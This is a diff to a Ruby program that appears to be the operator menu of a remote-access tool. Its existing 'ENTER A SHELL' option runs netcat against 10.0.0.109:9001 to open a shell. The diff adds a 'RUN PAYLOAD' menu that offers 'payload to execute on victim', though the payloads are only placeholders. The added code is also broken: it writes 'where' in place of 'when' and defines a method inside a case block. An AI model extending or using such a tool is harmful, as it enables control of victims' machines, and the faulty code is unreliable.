@@ -46,9 +46,6 @@ end
 #==================#
 #    |CLIENT|      #
 #==================#
-#==================#
-#    |CLIENT|      #
-#==================#
 def client_menu
   rows = $db.execute("SELECT * FROM users")
   if rows.empty?
@@ -70,14 +67,38 @@ def client_menu_entry
   prompt = TTY::Prompt.new
   choice = prompt.select("Choose an Action") do |menu|
     menu.choice "ENTER A SHELL"
+    menu.choice "RUN PAYLOAD"
     menu.choice "BACK"
   end
   case choice
     when "ENTER A SHELL"
       system("nc 10.0.0.109 9001") # replace with spawn when done testing/playing
+    when "RUN PAYLOAD"
+      client_menu_payloads
     when "BACK"
       client_menu
   end
+
+  def client_menu_payloads
+
+  prompt = TTY::Prompt.new
+  choice = prompt.select("select payload to execute on victim") do |menu|
+    menu.choice "PAYLOAD1"
+    menu.choice "PAYLOAD2"
+    menu.choice "PAYLOAD3"
+    menu.choice "RUN LOCAL"
+  end
+  case choice
+    where "PAYLOAD1"
+      puts "PAYLOAD1"
+    where "PAYLOAD2"
+      puts "PAYLOAD2"
+    where "PAYLOAD3"
+      puts "PAYLOAD3"
+    where "RUN LOCAL"
+      puts "RUN LOCAL"
+  end
+
 end
 
 #==================#
